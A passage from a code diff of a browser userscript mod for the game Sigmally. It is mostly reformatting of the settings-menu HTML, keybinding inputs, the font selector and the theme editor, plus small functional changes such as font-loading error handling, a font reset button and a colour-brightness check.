-                                                    <input type="text" name="toggle.menu" id="modinput6" class="keybinding" value="${modSettings.macros.keys.toggle.menu || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                    <input type="text" name="toggle.menu" id="modinput6" class="keybinding" value="${
+                modSettings.macros.keys
+                    .toggle.menu || ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                 </div>
 
                                                 <div class="stats-line justify-sb">
                                                     <span>Toggle Names</span>
-                                                    <input value="${modSettings.macros.keys.toggle.names || ''}" placeholder="..." readonly id="modinput11" name="toggle.names" class="keybinding" onfocus="this.select();">
+                                                    <input value="${
+                modSettings.macros.keys
+                    .toggle.names || ''
+            }" placeholder="..." readonly id="modinput11" name="toggle.names" class="keybinding" onfocus="this.select();">
                                                 </div>
 
                                                 <div class="stats-line justify-sb">
                                                     <span>Toggle Skins</span>
-                                                    <input value="${modSettings.macros.keys.toggle.skins || ''}" placeholder="..." readonly id="modinput12" name="toggle.skins" class="keybinding" onfocus="this.select();">
+                                                    <input value="${
+                modSettings.macros.keys
+                    .toggle.skins || ''
+            }" placeholder="..." readonly id="modinput12" name="toggle.skins" class="keybinding" onfocus="this.select();">
                                                 </div>
 
                                                 <div class="stats-line justify-sb">
                                                 <span>Toggle Autorespawn</span>
-                                                    <input value="${modSettings.macros.keys.toggle.autoRespawn || ''}" placeholder="..." readonly id="modinput13" name="toggle.autoRespawn" class="keybinding" onfocus="this.select();">
+                                                    <input value="${
+                modSettings.macros.keys
+                    .toggle
+                    .autoRespawn || ''
+            }" placeholder="..." readonly id="modinput13" name="toggle.autoRespawn" class="keybinding" onfocus="this.select();">
                                                 </div>
                                             </div>
                                         </div>
@@ -4551,11 +4707,19 @@
                                                 </div>
                                                 <div class="stats-line justify-sb">
                                                     <span>Double Trick</span>
-                                                    <input value="${modSettings.macros.keys.splits.doubleTrick || ''}" placeholder="..." readonly id="modinput14" name="splits.doubleTrick" class="keybinding" onfocus="this.select();">
+                                                    <input value="${
+                modSettings.macros.keys
+                    .splits
+                    .doubleTrick || ''
+            }" placeholder="..." readonly id="modinput14" name="splits.doubleTrick" class="keybinding" onfocus="this.select();">
                                                 </div>
                                                 <div class="stats-line justify-sb">
                                                     <span>Self Trick</span>
-                                                    <input value="${modSettings.macros.keys.splits.selfTrick || ''}" placeholder="..." readonly id="modinput15" name="splits.selfTrick" class="keybinding" onfocus="this.select();">
+                                                    <input value="${
+                modSettings.macros.keys
+                    .splits.selfTrick ||
+                ''
+            }" placeholder="..." readonly id="modinput15" name="splits.selfTrick" class="keybinding" onfocus="this.select();">
                                                 </div>
                                             </div>
                                         </div>
@@ -4609,28 +4773,50 @@
 										<div class="justify-sb w-100 p-10">
 											<span class="text">Names</span>
 											<div class="modCheckbox">
-											  <input id="mod-showNames" type="checkbox" ${JSON.parse(localStorage.getItem('settings'))?.showNames ? 'checked' : ''} />
+											  <input id="mod-showNames" type="checkbox" ${
+                JSON.parse(
+                    localStorage.getItem(
+                        'settings'
+                    )
+                )?.showNames
+                    ? 'checked'
+                    : ''
+            } />
 											  <label class="cbx" for="mod-showNames"></label>
 											</div>
 										</div>
 										<div class="justify-sb w-100 accent_row p-10 rounded">
 											<span class="text">Skins</span>
 											<div class="modCheckbox">
-											  <input id="mod-showSkins" type="checkbox" ${JSON.parse(localStorage.getItem('settings'))?.showSkins ? 'checked' : ''} />
+											  <input id="mod-showSkins" type="checkbox" ${
+                JSON.parse(
+                    localStorage.getItem(
+                        'settings'
+                    )
+                )?.showSkins
+                    ? 'checked'
+                    : ''
+            } />
 											  <label class="cbx" for="mod-showSkins"></label>
 											</div>
 										</div>
 										<div class="justify-sb w-100 p-10 rounded">
 											<span title="Long nicknames will be shorten on the leaderboard & ingame">Shorten names</span>
 											<div class="modCheckbox">
-											  <input id="shortenNames" type="checkbox" ${modSettings.game.shortenNames && 'checked'} />
+											  <input id="shortenNames" type="checkbox" ${
+                modSettings.game
+                    .shortenNames && 'checked'
+            } />
 											  <label class="cbx" for="shortenNames"></label>
 											</div>
 										</div>
 										<div class="justify-sb w-100 accent_row p-10">
 											<span>Text outlines & shadows</span>
 											<div class="modCheckbox">
-											  <input id="removeOutlines" type="checkbox" ${modSettings.gameShortenNames && 'checked'} />
+											  <input id="removeOutlines" type="checkbox" ${
+                modSettings.gameShortenNames &&
+                'checked'
+            } />
 											  <label class="cbx" for="removeOutlines"></label>
 											</div>
 										</div>
@@ -4647,14 +4833,20 @@
 										<div class="justify-sb w-100 accent_row p-10 rounded">
 											<span class="text">Play timer</span>
 											<div class="modCheckbox">
-											  <input type="checkbox" id="playTimerToggle" ${modSettings.settings.playTimer && 'checked'} />
+											  <input type="checkbox" id="playTimerToggle" ${
+                modSettings.settings
+                    .playTimer && 'checked'
+            } />
 											  <label class="cbx" for="playTimerToggle"></label>
 											</div>
 										</div>
 										<div class="justify-sb w-100 p-10 rounded">
 											<span class="text">Mouse tracker</span>
 											<div class="modCheckbox">
-											  <input type="checkbox" id="mouseTrackerToggle" ${modSettings.settings.mouseTracker && 'checked'} />
+											  <input type="checkbox" id="mouseTrackerToggle" ${
+                modSettings.settings
+                    .mouseTracker && 'checked'
+            } />
 											  <label class="cbx" for="mouseTrackerToggle"></label>
 											</div>
 										</div>
@@ -4746,7 +4938,10 @@
 								<div class="modColItems_2">
 									<label class="macroRow w-100">
 									  <span class="text">Keybind to save image</span>
-									  <input type="text" name="saveImage" id="modinput17" class="keybinding" value="${modSettings.macros.keys.saveImage || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+									  <input type="text" name="saveImage" id="modinput17" class="keybinding" value="${
+                modSettings.macros.keys.saveImage ||
+                ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
 									</label>
 								</div>
 								<div class="modColItems_2">
@@ -4805,6 +5000,9 @@
 										</div>
 									</div>
 								</div>
+                                <div>
+                                   Install <a href="https://greasyfork.org/scripts/483587-sigmally-fixes-v2" target="_blank">Sigmally Fixes</a> for better performance!
+                                </div>
 
                                 <div class="mt-auto flex f-column g-10">
 									<div class="brand_yt">
@@ -4864,7 +5062,7 @@
                 }
 
                 allTabButtons.forEach((tabBtn) =>
-                    tabBtn.classList.remove('mod_selected'),
+                    tabBtn.classList.remove('mod_selected')
                 );
 
                 if (tabId === 'mod_gallery') {
@@ -4884,16 +5082,16 @@
             window.openModTab = openModTab;
 
             document.querySelectorAll('.mod_nav_btn').forEach((tabBtn) => {
-                tabBtn.addEventListener('click', function() {
+                tabBtn.addEventListener('click', function () {
                     openModTab.call(
                         this,
-                        this.id.replace('tab_', 'mod_').replace('_btn', ''),
+                        this.id.replace('tab_', 'mod_').replace('_btn', '')
                     );
                 });
             });
 
             const openMenu = document.querySelectorAll(
-                '#clans_and_settings button',
+                '#clans_and_settings button'
             )[1];
             openMenu.removeAttribute('onclick');
             openMenu.addEventListener('click', () => {
@@ -4912,29 +5110,56 @@
             });
 
             const fontSelectContainer = document.querySelector(
-                '#font-select-container',
+                '#font-select-container'
             );
 
-            const fonts = await this.getGoogleFonts();
-            const selectElement = this.render_sm_select(
-                'Select Font',
-                fonts,
-                {
-                    width: '200px',
-                },
-                modSettings.game.font,
-            );
-            fontSelectContainer.replaceWith(selectElement);
+            try {
+                const fonts = await this.getGoogleFonts();
 
-            selectElement.addEventListener('change', (e) => {
-                const link = document.createElement('link');
-                link.href = `https://fonts.googleapis.com/css2?family=${e.detail}&display=swap`;
-                link.rel = 'stylesheet';
-                document.head.appendChild(link);
+                const { container: selectElement, selectButton } =
+                    this.render_sm_select(
+                        'Select Font',
+                        fonts,
+                        { width: '200px' },
+                        modSettings.game.font
+                    );
 
-                modSettings.game.font = e.detail;
-                updateStorage();
-            });
+                const resetFont = document.createElement('button');
+                resetFont.classList.add('resetButton');
+
+                resetFont.addEventListener('click', () => {
+                    if (modSettings.game.font === 'Ubuntu') return;
+
+                    modSettings.game.font = 'Ubuntu';
+                    updateStorage();
+                    selectElement.value = 'Ubuntu';
+
+                    // just change the text of the selectButton
+                    selectButton.querySelector('span').textContent = 'Ubuntu';
+                });
+
+                const container = document.createElement('div');
+                container.classList.add('centerXY', 'g-5');
+                container.append(resetFont, selectElement);
+
+                selectElement.addEventListener('change', (e) => {
+                    const font = e.detail;
+                    const link = document.createElement('link');
+                    link.href = `https://fonts.googleapis.com/css2?family=${font}&display=swap`;
+                    link.rel = 'stylesheet';
+                    document.head.appendChild(link);
+
+                    modSettings.game.font = font;
+                    updateStorage();
+                });
+
+                fontSelectContainer.replaceWith(container);
+            } catch (e) {
+                fontSelectContainer.replaceWith(
+                    "Couldn't load fonts, try again later."
+                );
+                console.error(e);
+            }
 
             if (modSettings.game.font !== 'Ubuntu') {
                 const link = document.createElement('link');
@@ -4968,7 +5193,7 @@
             resetModSettings.addEventListener('click', () => {
                 if (
                     confirm(
-                        'Are you sure you want to reset the mod settings? A reload is required.',
+                        'Are you sure you want to reset the mod settings? A reload is required.'
                     )
                 ) {
                     this.removeStorage(storageName);
@@ -4980,7 +5205,7 @@
             resetGameSettings.addEventListener('click', () => {
                 if (
                     confirm(
-                        'Are you sure you want to reset the game settings? Your nick and more settings will be lost. A reload is required.',
+                        'Are you sure you want to reset the game settings? Your nick and more settings will be lost. A reload is required.'
                     )
                 ) {
                     window.settings.gameSettings = null;
@@ -5013,14 +5238,16 @@
                 'background: rgba(0, 0, 0, 0.4); color: #fff; border: 1px solid #A2A2A2; border-radius: 5px; padding: 8px; cursor: pointer; display: flex; justify-content: space-between; align-items: center;';
 
             selectButton.innerHTML = `
-        <span>${label}</span>
-        <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="#000000" width="20">
-          <path fill="#fafafa" d="M13.098 8H6.902c-.751 0-1.172.754-.708 1.268L9.292 12.7c.36.399 1.055.399 1.416 0l3.098-3.433C14.27 8.754 13.849 8 13.098 8Z"></path>
-        </svg>
-      `;
+               <span>${label}</span>
+               <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="#000000" width="20">
+                 <path fill="#fafafa" d="M13.098 8H6.902c-.751 0-1.172.754-.708 1.268L9.292 12.7c.36.399 1.055.399 1.416 0l3.098-3.433C14.27 8.754 13.849 8 13.098 8Z"></path>
+               </svg>
+            `;
 
             if (defaultValue && items.includes(defaultValue)) {
-                selectButton.innerHTML = `<span>${defaultValue}</span> ${selectButton.innerHTML.split('</svg>')[1]}`;
+                selectButton.innerHTML = `<span>${defaultValue}</span> ${
+                    selectButton.innerHTML.split('</svg>')[1]
+                }`;
             }
 
             container.appendChild(selectButton);
@@ -5053,19 +5280,23 @@
                 const option = createElement(
                     'div',
                     { padding: '5px', cursor: 'pointer' },
-                    item,
+                    item
                 );
                 option.onclick = () => {
                     selectButton.innerHTML = `
-            <span>${item}</span>
-            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="#000000" width="20">
-              <path fill="#fafafa" d="M13.098 8H6.902c-.751 0-1.172.754-.708 1.268L9.292 12.7c.36.399 1.055.399 1.416 0l3.098-3.433C14.27 8.754 13.849 8 13.098 8Z"></path>
-            </svg>`;
+                        <span>${item}</span>
+                        <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="#000000" width="20">
+                          <path fill="#fafafa" d="M13.098 8H6.902c-.751 0-1.172.754-.708 1.268L9.292 12.7c.36.399 1.055.399 1.416 0l3.098-3.433C14.27 8.754 13.849 8 13.098 8Z"></path>
+                        </svg>`;
                     dropdown.style.display = 'none';
-                    container.dispatchEvent(new CustomEvent('change', { detail: item }));
+                    container.dispatchEvent(
+                        new CustomEvent('change', { detail: item })
+                    );
                 };
-                option.onmouseover = (e) => (e.target.style.background = '#555');
-                option.onmouseout = (e) => (e.target.style.background = 'transparent');
+                option.onmouseover = (e) =>
+                    (e.target.style.background = '#555');
+                option.onmouseout = (e) =>
+                    (e.target.style.background = 'transparent');
                 dropdown.append(option);
             });
 
@@ -5077,7 +5308,8 @@
             };
 
             document.onclick = (e) => {
-                if (!container.contains(e.target)) dropdown.style.display = 'none';
+                if (!container.contains(e.target))
+                    dropdown.style.display = 'none';
             };
 
             searchBox.addEventListener('input', () => {
@@ -5085,13 +5317,15 @@
                 Array.from(dropdown.children)
                     .slice(1)
                     .forEach((item) => {
-                        item.style.display = item.textContent.toLowerCase().includes(filter)
+                        item.style.display = item.textContent
+                            .toLowerCase()
+                            .includes(filter)
                             ? 'block'
                             : 'none';
                     });
             });
 
-            return container;
+            return { container, selectButton };
         },
 
         setProfile(user) {
@@ -5110,7 +5344,10 @@
             badges.innerHTML =
                 user.badges && user.badges.length > 0
                     ? user.badges
-                        .map((badge) => `<span class="mod_badge">${badge}</span>`)
+                        .map(
+                            (badge) =>
+                                `<span class="mod_badge">${badge}</span>`
+                        )
                         .join('')
                     : '<span>User has no badges.</span>';
 
@@ -5119,8 +5356,11 @@
 
         getSettings() {
             const mod_qaccess = document.querySelector('#mod_qaccess');
-            const settingsGrid = document.querySelector('#settings > .checkbox-grid');
-            const settingsNames = settingsGrid.querySelectorAll('label:not([class])');
+            const settingsGrid = document.querySelector(
+                '#settings > .checkbox-grid'
+            );
+            const settingsNames =
+                settingsGrid.querySelectorAll('label:not([class])');
             const inputs = settingsGrid.querySelectorAll('input');
 
             inputs.forEach((checkbox, index) => {
@@ -5154,7 +5394,7 @@
                     Object.assign(document.createElement('label'), {
                         classList: ['cbx'],
                         htmlFor: checkbox.id,
-                    }),
+                    })
                 );
             });
         },
@@ -5303,7 +5543,7 @@
                 const imageTab = byId('theme_editor_image');
                 const gradientAngleDiv = byId('theme-editor-gradient_angle');
 
-                themeTypeSelect.addEventListener('change', function() {
+                themeTypeSelect.addEventListener('change', function () {
                     const selectedOption = themeTypeSelect.value;
                     switch (selectedOption) {
                         case 'Static Color':
@@ -5329,22 +5569,26 @@
                 });
 
                 const colorInputs = document.querySelectorAll(
-                    '#theme_editor_color .colorInput',
+                    '#theme_editor_color .colorInput'
                 );
                 colorInputs.forEach((input) => {
-                    input.addEventListener('input', function() {
-                        const bgColorInput = byId('theme-editor-bgcolorinput').value;
-                        const textColorInput = byId('theme-editor-colorinput').value;
+                    input.addEventListener('input', function () {
+                        const bgColorInput = byId(
+                            'theme-editor-bgcolorinput'
+                        ).value;
+                        const textColorInput = byId(
+                            'theme-editor-colorinput'
+                        ).value;
 
                         applyColorTheme(bgColorInput, textColorInput);
                     });
                 });
 
                 const gradientInputs = document.querySelectorAll(
-                    '#theme_editor_gradient .colorInput',
+                    '#theme_editor_gradient .colorInput'
                 );
                 gradientInputs.forEach((input) => {
-                    input.addEventListener('input', function() {
+                    input.addEventListener('input', function () {
                         const gColor1 = byId('theme-editor-gcolor1').value;
                         const gColor2 = byId('theme-editor-g_color').value;
                         const gTextColor = byId('theme-editor-gcolor2').value;
@@ -5356,19 +5600,21 @@
                             gColor2,
                             gTextColor,
                             gAngle,
-                            gradientType,
+                            gradientType
                         );
                     });
                 });
 
                 const imageInputs = document.querySelectorAll(
-                    '#theme_editor_image .colorInput',
+                    '#theme_editor_image .colorInput'
                 );
                 imageInputs.forEach((input) => {
-                    input.addEventListener('input', function() {
-                        const imageLinkInput = byId('theme-editor-imagelink').value;
+                    input.addEventListener('input', function () {
+                        const imageLinkInput = byId(
+                            'theme-editor-imagelink'
+                        ).value;
                         const textColorImageInput = byId(
-                            'theme-editor-textcolorImage',
+                            'theme-editor-textcolorImage'
                         ).value;
 
                         let img;
@@ -5396,7 +5642,7 @@
                     timeoutId = setTimeout(() => {
                         const imageLinkInput = image_link.value;
                         const textColorImageInput = byId(
-                            'theme-editor-textcolorImage',
+                            'theme-editor-textcolorImage'
                         ).value;
 
                         let img;
@@ -5414,7 +5660,7 @@
                 const gradientTypeSelect = byId('gradient-type');
                 const angleInput = byId('g_angle');
 
-                gradientTypeSelect.addEventListener('change', function() {
+                gradientTypeSelect.addEventListener('change', function () {
                     const selectedType = gradientTypeSelect.value;
                     gradientAngleDiv.style.display =
                         selectedType === 'linear' ? 'flex' : 'none';
@@ -5429,11 +5675,11 @@
                         gColor2,
                         gTextColor,
                         gAngle,
-                        selectedType,
+                        selectedType
                     );
                 });
 
-                angleInput.addEventListener('input', function() {
+                angleInput.addEventListener('input', function () {
                     const gradient_angle_text = byId('gradient_angle_text');
                     gradient_angle_text.innerText = `Angle (${angleInput.value}deg): `;
                     const gColor1 = byId('theme-editor-gcolor1').value;
@@ -5447,13 +5693,13 @@
                         gColor2,
                         gTextColor,
                         gAngle,
-                        gradientType,
+                        gradientType
                     );
                 });
 
                 function applyColorTheme(bgColor, textColor) {
                     const previewDivs = document.querySelectorAll(
-                        '#theme_editor_color .themes_preview',
+                        '#theme_editor_color .themes_preview'
                     );
                     previewDivs.forEach((previewDiv) => {
                         previewDiv.style.backgroundColor = bgColor;
@@ -5467,10 +5713,10 @@
                     gColor2,
                     gTextColor,
                     gAngle,
-                    gradientType,
+                    gradientType
                 ) {
                     const previewDivs = document.querySelectorAll(
-                        '#theme_editor_gradient .themes_preview',
+                        '#theme_editor_gradient .themes_preview'
                     );
                     previewDivs.forEach((previewDiv) => {
                         const gradient =
@@ -5485,7 +5731,7 @@
 
                 function applyImageTheme(imageLink, textColor) {
                     const previewDivs = document.querySelectorAll(
-                        '#theme_editor_image .themes_preview',
+                        '#theme_editor_image .themes_preview'
                     );
                     previewDivs.forEach((previewDiv) => {
                         previewDiv.style.backgroundImage = `url('${imageLink}')`;
@@ -5512,8 +5758,12 @@
 
                 saveColorThemeBtn.addEventListener('click', () => {
                     const name = byId('colorThemeName').value;
-                    const bgColorInput = byId('theme-editor-bgcolorinput').value;
-                    const textColorInput = byId('theme-editor-colorinput').value;
+                    const bgColorInput = byId(
+                        'theme-editor-bgcolorinput'
+                    ).value;
+                    const textColorInput = byId(
+                        'theme-editor-colorinput'
+                    ).value;
 
                     if (name === '') return;
 
@@ -5527,7 +5777,9 @@
                     themeCard.classList.add('theme');
                     let themeBG;
                     if (theme.background.includes('http')) {
-                        themeBG = `background: url(${theme.preview || theme.background})`;
+                        themeBG = `background: url(${
+                            theme.preview || theme.background
+                        })`;
                     } else {
                         themeBG = `background: ${theme.background}`;
                     }
@@ -5544,9 +5796,11 @@
                         ev.preventDefault();
                         if (confirm('Do you want to delete this Theme?')) {
                             themeCard.remove();
-                            const themeIndex = modSettings.themes.custom.findIndex(
-                                (addedTheme) => addedTheme.name === theme.name,
-                            );
+                            const themeIndex =
+                                modSettings.themes.custom.findIndex(
+                                    (addedTheme) =>
+                                        addedTheme.name === theme.name
+                                );
                             if (themeIndex !== -1) {
                                 modSettings.themes.custom.splice(themeIndex, 1);
                                 updateStorage();
@@ -5590,7 +5844,9 @@
                     themeCard.classList.add('theme');
                     let themeBG;
                     if (theme.background.includes('http')) {
-                        themeBG = `background: url(${theme.preview || theme.background})`;
+                        themeBG = `background: url(${
+                            theme.preview || theme.background
+                        })`;
                     } else {
                         themeBG = `background: ${theme.background}`;
                     }
@@ -5607,9 +5863,11 @@
                         ev.preventDefault();
                         if (confirm('Do you want to delete this Theme?')) {
                             themeCard.remove();
-                            const themeIndex = modSettings.themes.custom.findIndex(
-                                (addedTheme) => addedTheme.name === theme.name,
-                            );
+                            const themeIndex =
+                                modSettings.themes.custom.findIndex(
+                                    (addedTheme) =>
+                                        addedTheme.name === theme.name
+                                );
                             if (themeIndex !== -1) {
                                 modSettings.themes.custom.splice(themeIndex, 1);
                                 updateStorage();
@@ -5629,7 +5887,9 @@
                 saveImageThemeBtn.addEventListener('click', () => {
                     const name = byId('imageThemeName').value;
                     const imageLink = byId('theme-editor-imagelink').value;
-                    const textColorImageInput = byId('theme-editor-textcolorImage').value;
+                    const textColorImageInput = byId(
+                        'theme-editor-textcolorImage'
+                    ).value;
 
                     if (name === '' || imageLink === '') return;
 
@@ -5643,7 +5903,9 @@
                     themeCard.classList.add('theme');
                     let themeBG;
                     if (theme.background.includes('http')) {
-                        themeBG = `background: url(${theme.preview || theme.background})`;
+                        themeBG = `background: url(${
+                            theme.preview || theme.background
+                        })`;
                     } else {
                         themeBG = `background: ${theme.background}`;
                     }
@@ -5660,9 +5922,11 @@
                         ev.preventDefault();
                         if (confirm('Do you want to delete this Theme?')) {
                             themeCard.remove();
-                            const themeIndex = modSettings.themes.custom.findIndex(
-                                (addedTheme) => addedTheme.name === theme.name,
-                            );
+                            const themeIndex =
+                                modSettings.themes.custom.findIndex(
+                                    (addedTheme) =>
+                                        addedTheme.name === theme.name
+                                );
                             if (themeIndex !== -1) {
                                 modSettings.themes.custom.splice(themeIndex, 1);
                                 updateStorage();
@@ -5682,7 +5946,7 @@
 
             const b_inner = document.querySelector('.body__inner');
             let bodyColorElements = b_inner.querySelectorAll(
-                '.body__inner > :not(.body__inner), #s-skin-select-icon-text',
+                '.body__inner > :not(.body__inner), #s-skin-select-icon-text'
             );
 
             const toggleColor = (element, background, text) => {
@@ -5700,7 +5964,7 @@
             };
 
             const openSVG = document.querySelector(
-                '#clans_and_settings > Button:nth-of-type(2) > svg',
+                '#clans_and_settings > Button:nth-of-type(2) > svg'
             );
             const openSVGPath = openSVG.querySelector('path');
             openSVG.setAttribute('width', '36');
@@ -5724,7 +5988,8 @@
                         let allApplied = true;
 
                         elements.forEach((selector) => {
-                            const elements = document.querySelectorAll(selector);
+                            const elements =
+                                document.querySelectorAll(selector);
                             elements.forEach((el) => {
                                 if (el && !appliedElements.has(el)) {
                                     applyThemeToElement(el, theme);
@@ -5736,7 +6001,11 @@
                         customTextElements.forEach((qs) => {
                             document.querySelectorAll(qs).forEach((el) => {
                                 if (!appliedElements.has(el)) {
-                                    el.style.setProperty('color', theme.text, 'important');
+                                    el.style.setProperty(
+                                        'color',
+                                        theme.text,
+                                        'important'
+                                    );
                                     appliedElements.add(el);
                                     allApplied = false;
                                 }
@@ -5756,10 +6025,18 @@
                             return;
                         }
 
-                        // Apply the SVG path color
+                        const isBright = (color) => {
+                            if (!color.startsWith('#') || color.length !== 7)
+                                return false;
+                            const r = parseInt(color.slice(1, 3), 16);
+                            const g = parseInt(color.slice(3, 5), 16);
+                            const b = parseInt(color.slice(5, 7), 16);
+                            return r * 0.299 + g * 0.587 + b * 0.114 > 186;
+                        };
+
                         openSVGPath.setAttribute(
                             'fill',
-                            theme.text === '#FFFFFF' ? '#fff' : '#222',
+                            isBright(theme.text) ? theme.text : '#222'
                         );
 
                         modSettings.themes.current = theme.name;
@@ -5808,97 +6085,113 @@
                     },
                     {
                         name: 'Gaming',
-                        background: 'https://i.ibb.co/DwKkQfh/BG-1-lower-quality.jpg',
+                        background:
+                            'https://i.ibb.co/DwKkQfh/BG-1-lower-quality.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Shapes',
                         background: 'https://i.ibb.co/h8TmVyM/BG-2.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-2.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-2.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Blue',
                         background: 'https://i.ibb.co/9yQBfWj/BG-3.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-3.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-3.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Blue - 2',
                         background: 'https://i.ibb.co/7RJvNCX/BG-4.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-4.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-4.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Purple',
                         background: 'https://i.ibb.co/vxY15Tv/BG-5.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-5.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-5.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Orange Blue',
                         background: 'https://i.ibb.co/99nfFBN/BG-6.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-6.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-6.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Gradient',
                         background: 'https://i.ibb.co/hWMLwLS/BG-7.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-7.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-7.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Sky',
                         background: 'https://i.ibb.co/P4XqDFw/BG-9.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-9.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-9.jpg',
                         text: '#000000',
                     },
                     {
                         name: 'Sunset',
                         background: 'https://i.ibb.co/0BVbYHC/BG-10.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/BG-10.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/BG-10.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Galaxy',
                         background: 'https://i.ibb.co/MsssDKP/Galaxy.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/Galaxy.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/Galaxy.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Planet',
                         background: 'https://i.ibb.co/KLqWM32/Planet.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/Planet.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/Planet.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'colorful',
                         background: 'https://i.ibb.co/VqtB3TX/colorful.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/colorful.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/colorful.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Sunset - 2',
                         background: 'https://i.ibb.co/TLp2nvv/Sunset.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/Sunset.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/Sunset.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Epic',
                         background: 'https://i.ibb.co/kcv4tvn/Epic.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/Epic.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/Epic.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Galaxy - 2',
                         background: 'https://i.ibb.co/smRs6V0/galaxy.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/galaxy2.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/galaxy2.jpg',
                         text: '#FFFFFF',
                     },
                     {
                         name: 'Cloudy',
                         background: 'https://i.ibb.co/MCW7Bcd/cloudy.png',
-                        preview: 'https://czrsd.com/static/sigmod/themes/cloudy.jpg',
+                        preview:
+                            'https://czrsd.com/static/sigmod/themes/cloudy.jpg',
                         text: '#000000',
                     },
                 ],
@@ -5909,7 +6202,9 @@
                 themeCard.classList.add('theme');
                 let themeBG;
                 if (theme.background.includes('http')) {
-                    themeBG = `background: url(${theme.preview || theme.background})`;
+                    themeBG = `background: url(${
+                        theme.preview || theme.background
+                    })`;
                 } else {
                     themeBG = `background: ${theme.background}`;
                 }
@@ -5929,16 +6224,21 @@
                             ev.preventDefault();
                             if (confirm('Do you want to delete this Theme?')) {
                                 themeCard.remove();
-                                const themeIndex = modSettings.themes.custom.findIndex(
-                                    (addedTheme) => addedTheme.name === theme.name,
-                                );
+                                const themeIndex =
+                                    modSettings.themes.custom.findIndex(
+                                        (addedTheme) =>
+                                            addedTheme.name === theme.name
+                                    );
                                 if (themeIndex !== -1) {
-                                    modSettings.themes.custom.splice(themeIndex, 1);
+                                    modSettings.themes.custom.splice(
+                                        themeIndex,
+                                        1
+                                    );
                                     updateStorage();
                                 }
                             }
                         },
-                        false,
+                        false
                     );
                 }
 
@@ -5952,7 +6252,10 @@
                 themesContainer.append(themeCard);
             });
 
-            const orderlyThemes = [...themes.orderly, ...modSettings.themes.custom];
+            const orderlyThemes = [
+                ...themes.orderly,
+                ...modSettings.themes.custom,
+            ];
             orderlyThemes.sort((a, b) => a.name.localeCompare(b.name));
             orderlyThemes.forEach((theme) => {
                 const themeCard = createThemeCard(theme);
@@ -5963,13 +6266,15 @@
             if (savedTheme) {
                 let selectedTheme;
                 selectedTheme = themes.defaults.find(
-                    (theme) => theme.name === savedTheme,
+                    (theme) => theme.name === savedTheme
                 );
                 if (!selectedTheme) {
                     selectedTheme =
-                        themes.orderly.find((theme) => theme.name === savedTheme) ||
+                        themes.orderly.find(
+                            (theme) => theme.name === savedTheme
+                        ) ||
                         modSettings.themes.custom.find(
-                            (theme) => theme.name === savedTheme,
+                            (theme) => theme.name === savedTheme
                         );
                 }
 
@@ -6006,19 +6311,19 @@
                 'inputBorderRadius',
                 `${inputBorderRadius.value}px`,
                 ['.form-control'],
-                'borderRadius',
+                'borderRadius'
             );
             setCSS(
                 'menuBorderRadius',
                 `${menuBorderRadius.value}px`,
                 [...elements, '.text-block'],
-                'borderRadius',
+                'borderRadius'
             );
             setCSS(
                 'inputBorder',
                 inputBorder.checked ? '1px' : '0px',
                 ['.form-control'],
-                'borderWidth',
+                'borderWidth'
             );
 
             inputBorderRadius.addEventListener('input', () =>
@@ -6026,24 +6331,24 @@
                     'inputBorderRadius',
                     `${inputBorderRadius.value}px`,
                     ['.form-control'],
-                    'borderRadius',
-                ),
+                    'borderRadius'
+                )
             );
             menuBorderRadius.addEventListener('input', () =>
                 setCSS(
                     'menuBorderRadius',
                     `${menuBorderRadius.value}px`,
                     [...elements, '.text-block'],
-                    'borderRadius',
-                ),
+                    'borderRadius'
+                )
             );
             inputBorder.addEventListener('input', () =>
                 setCSS(
